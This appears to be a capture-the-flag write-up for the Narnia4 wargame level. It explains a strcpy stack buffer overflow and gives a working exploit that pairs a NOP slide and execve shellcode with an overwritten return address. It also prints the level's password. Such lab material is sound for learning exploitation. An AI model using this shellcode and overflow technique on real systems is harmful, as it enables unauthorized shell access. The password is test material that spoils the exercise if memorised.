# **Let's jump into narnia4!**
-----------------------------------

You start to get use to it ;)) Let's read our code first!
```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

Alright perfect so waht could be new here? 
> the `extern char **environ;` is basically a pointer that point to an env variables!

After reading our code we can find an interesting part, our buffer is sized at 256 and we use a strcpy directly from our args
So if we give him more than 256, strcpy would not mind and copy everything causing an overflow
*(The central part is just setting our environnement to null, for now let's just don't mind it)*

As we did in Narnia2, we do want to understand the binary of what's happening here, so let's just run gdb narnia4
to see all of this in action we're gonna run it with 256 char and a deadbeef at the end
As we did the last time, we're gonna find our deadbeef by adding or removing chars

```bash
run `python -c 'print "R"*256 + "\xef\xbe\xad\xde"'`
```
And then we add like 6char `"R"*262` and we see f700dead
so let's push two over char and we see our deadbeef!! we have our breakpoint!
so let's re run this function and type in the command to get all the memory dump
`x/250x $esp`
I've cut the stack to the part we're interested in: where all our buffers data appear

```
----------------------------------cutted----------------------------------
0xffffd760:     0x8ab5511f      0x3a1579f1      0x695af69f      0x00363836
0xffffd770:     0x00000000      0x00000000      0x00000000      0x2f000000
0xffffd780:     0x6e72616e      0x6e2f6169      0x696e7261      0x52003461
0xffffd790:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd7a0:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd7b0:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd7c0:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd7d0:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd7e0:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd7f0:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd800:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd810:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd820:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd830:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd840:     0x52525252      0x52525252      0x52525252      0x52525252
---Type <return> to continue, or q <return> to quit---
0xffffd850:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd860:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd870:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd880:     0x52525252      0x52525252      0x52525252      0x52525252
0xffffd890:     0x52525252      0xef525252      0x00deadbe      0x00000000
0xffffd8a0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd8b0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd8c0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd8d0:     0x00000000      0x00000000      0x00000000      0x00000000
----------------------------------cutted----------------------------------
```

So we can see that our buffer start at 0xffffd790 ! 
Now it's time to choose a byte that we're gonna use as our return address, as long as they are fulfilled with our data, take the one you prefer, would be 0xffffd870 in my case

## Let's grab this Password!!
So this is the exact same way as we did to narnia2 ( pretty weird honestly i didn't see any change except the size of the buffer)
Let's once again take our shellcode.
It's time for some math --> 264bytes - 25bytes of shellcode = 239 NOP slide! (\x90)
+ 4Return Adress bytes (don't forget to convert them to little endian) at the end and we're done

```bash
run `python -c 'print "\x90"*239 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x70\xd8\xff\xff"'`
```

Now that we see that it works let's just use this command in our real env

```bash
./narnia4 `python -c 'print "\x90"*239 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x20\xd8\xff\xff"'`
```

We do have a new shell so let's just do a simple cat:
cat /etc/narnia_pass/narnia5     

**faimahchiy**

Well done! it wasn't that hard bc we've already done such a buffer overflow!
Let's jump into the next one


